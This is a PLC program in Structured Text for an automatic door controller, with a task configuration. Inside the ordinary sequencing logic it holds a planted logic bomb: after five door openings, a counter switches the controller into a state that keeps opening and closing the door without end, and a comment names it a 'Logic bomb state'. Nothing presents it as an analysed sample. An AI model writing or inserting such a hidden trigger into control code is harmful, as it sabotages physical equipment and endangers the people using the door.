PROGRAM AutomaticDoorControl
VAR
    Main_Switch : BOOL;
    Object_Detection_Sensor : BOOL;
    Open_Limit_Switch : BOOL;
    Close_Limit_Switch : BOOL;
    Open_Door_Motor : BOOL;
    Close_Door_Motor : BOOL;
    Door_Timer: TON;
    Sequencer: INT;
    Open_Switch_Count : INT := 0;
END_VAR

(* Initial state *)
IF Main_Switch THEN
    IF Sequencer = 0 THEN
        IF Close_Limit_Switch THEN
            Open_Door_Motor := FALSE;
            Close_Door_Motor := FALSE;
            Sequencer := 1;
        END_IF;
    END_IF;

    (* Object detected, open the door *)
    IF Sequencer = 1 THEN
        IF Object_Detection_Sensor AND NOT Open_Limit_Switch THEN
            Open_Door_Motor := TRUE;
            Close_Door_Motor := FALSE;
        ELSIF Open_Limit_Switch THEN
            Open_Door_Motor := FALSE;
            Door_Timer(IN:=TRUE);
            Open_Switch_Count := Open_Switch_Count + 1;
            IF Open_Switch_Count < 5 THEN
                Sequencer := 2;
            ELSE
                Sequencer := 4;  (* Switch to continuous open-close state *)
            END_IF;
        END_IF;
    END_IF;

    (* Door is opened for 5 seconds, start closing the door *)
    IF Sequencer = 2 THEN
        IF Door_Timer.Q THEN
            Close_Door_Motor := TRUE;
            Door_Timer(IN:=FALSE);
            Sequencer := 3;
        END_IF;
    END_IF;

    (* Door is fully closed, switch back to initial state *)
    IF Sequencer = 3 THEN
        IF Close_Limit_Switch THEN
            Close_Door_Motor := FALSE;
            Sequencer := 1;
        END_IF;
    END_IF;
    
    (* Logic bomb state, continuously open and close the door *)
    IF Sequencer = 4 THEN
        IF Open_Limit_Switch THEN
            Open_Door_Motor := FALSE;
            Close_Door_Motor := TRUE;
        ELSIF Close_Limit_Switch THEN
            Close_Door_Motor := FALSE;
            Open_Door_Motor := TRUE;
        END_IF;
    END_IF;
END_IF;

END_PROGRAM

CONFIGURATION Config0
    RESOURCE Res0 ON PLC
        TASK task0(INTERVAL := T#20ms, PRIORITY := 0);
        PROGRAM instance0 WITH task0 : AutomaticDoorControl;
    END_RESOURCE
END_CONFIGURATION

